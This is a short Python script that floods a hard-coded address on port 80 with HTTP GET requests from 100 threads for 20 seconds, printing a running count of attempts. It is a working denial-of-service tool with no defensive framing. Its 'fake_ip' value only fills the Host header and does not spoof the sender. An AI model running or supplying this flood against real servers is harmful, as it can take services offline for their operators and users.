import socket
import threading
import time

target = '10.0.0.138'
fake_ip = '182.21.20.32'
port = 80
thread_count = 100
duration = 20
t_end = time.time() + duration

attack_num = 0

def attack():
    while time.time() < t_end:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

for i in range(thread_count):
    thread = threading.Thread(target=attack)
    thread.start()